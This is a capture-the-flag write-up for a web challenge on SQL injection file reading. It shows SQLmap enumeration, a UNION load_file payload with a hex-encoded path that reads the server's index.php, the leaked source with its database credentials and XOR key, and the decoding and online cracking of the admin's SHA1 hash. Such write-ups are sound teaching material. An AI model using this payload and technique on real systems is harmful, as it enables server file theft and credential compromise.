# SQL injection - File reading - Medium

First, I use SQLmap to retrieve information quickly.

**Database:**

![image](https://user-images.githubusercontent.com/83667873/150838889-1b8c1f04-1c8a-4c72-b15d-bc2810911b00.png)

**Table:**

![image](https://user-images.githubusercontent.com/83667873/150838957-e5914ae0-e730-48b0-b767-4585f6c966f5.png)

**Column:**

![image](https://user-images.githubusercontent.com/83667873/150839028-f6021cff-24b6-4583-9648-1dd112193cf2.png)

**Password:**

![image](https://user-images.githubusercontent.com/83667873/150839080-9370dfb7-8c04-495a-9cf3-4e08a876922b.png)

I submit this value as admin's password, but "Authentication falied"

Pay attention to the title "File reading". Maybe We need to use sql injection to read file.

I will try to read file index.php

I will use load_file function to read file:

```
select 1,1,1,load_file(0x2F6368616C6C656E67652F7765622D736572766575722F636833312F696E6465782E706870)--
```
with `0x2F6368616C6C656E67652F7765622D736572766575722F636833312F696E6465782E706870` is hex encode of `/challenge/web-serveur/ch31/index.php` (path to index.php).

After submit, we can get content of file index.php:

```
<?php

define('SQL_HOST',      '/var/run/mysqld/mysqld3-web-serveur-ch31.sock');
define('SQL_DB',        'c_webserveur_31');
define('SQL_LOGIN',     'c_webserveur_31');
define('SQL_P',         'dOJLsrbyas3ZdrNqnhx');


function stringxor($o1, $o2) {
    $res = '';
    for($i=0;$i<strlen($o1);$i++)
        $res .= chr(ord($o1[$i]) ^ ord($o2[$i]));        
    return $res;
}

$key = "c92fcd618967933ac463feb85ba00d5a7ae52842";
 

$GLOBALS["___mysqli_ston"] = mysqli_connect('', SQL_LOGIN, SQL_P, "", 0, SQL_HOST) or exit('mysql connection error !');
mysqli_select_db($GLOBALS["___mysqli_ston"], SQL_DB) or die("Database selection error !");

if ( ! isset($_GET['action']) ) $_GET['action']="login";

if($_GET['action'] == "login"){
        print '<form METHOD="POST">
                <p><label style="display:inline-block;width:100px;">Login : </label><input type="text" name="username" /></p>
                <p><label style="display:inline-block;width:100px;">Password : </label><input type="password" name="password" /></p>
                <p><input value=submit type=submit /></p>
                </form>';

	if(isset($_POST['username'], $_POST['password']) && !empty($_POST['username']) && !empty($_POST['password']))
	{
		$user = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], strtolower($_POST['username']));
		$pass = sha1($_POST['password']);
		
		$result = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT member_password FROM member WHERE member_login='".$user."'");
		if(mysqli_num_rows($result) == 1)
		{
			$data = mysqli_fetch_array($result);
			if($pass == stringxor($key, base64_decode($data['member_password']))){
                                // authentication success
                                print "<p>Authentication success !!</p>";
                                if ($user == "admin")
                                    print "<p>Yeah !!! You're admin ! Use this password to complete this challenge.</p>";
                                else 
                                    print "<p>But... you're not admin !</p>";
			}
			else{
                                // authentication failed
				print "<p>Authentication failed !</p>";
			}
		}
		else{
			print "<p>User not found !</p>";
		}
	}
}

if($_GET['action'] == "members"){
	if(isset($_GET['id']) && !empty($_GET['id']))
	{
                // secure ID variable
		$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $_GET['id']);
		$result = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM member WHERE member_id=$id") or die(mysqli_error($GLOBALS["___mysqli_ston"]));
		
		if(mysqli_num_rows($result) == 1)
		{
			$data = mysqli_fetch_array($result);
			print "ID : ".$data["member_id"]."<br />";
			print "Username : ".$data["member_login"]."<br />";
			print "Email : ".$data["member_email"]."<br />";	
		}
                else{
                        print "no result found";
                }
	}
	else{
		$result = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM member");
		while ($row = mysqli_fetch_assoc($result)) {
			print "<p><a href=\"?action=members&id=".$row['member_id']."\">".$row['member_login']."</a></p>";
		}
	}
}

?>
```
Follow above code, admin's password will be encode by sha1 hash, and recieved value will xor with $key by stringxor function which is defined in index.php file.

First, find hashed password:

```
<?php
function stringxor($o1, $o2) {
    $res = '';
    for($i=0;$i<strlen($o1);$i++)
        $res .= chr(ord($o1[$i]) ^ ord($o2[$i]));        
    return $res;
}
echo stringxor('c92fcd618967933ac463feb85ba00d5a7ae52842',base64_decode('VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA==')); 
?>
```

The output value is `77be4fc97f77f5f48308942bb6e32aacabed9cef`

Use this link to find admin's password:

https://md5decrypt.net/en/Sha1/

![image](https://user-images.githubusercontent.com/83667873/150841638-3ccabe73-af55-495c-802d-ba0e7859b378.png)


Value found: `superpassword`

Submit this value and solve the challenge.
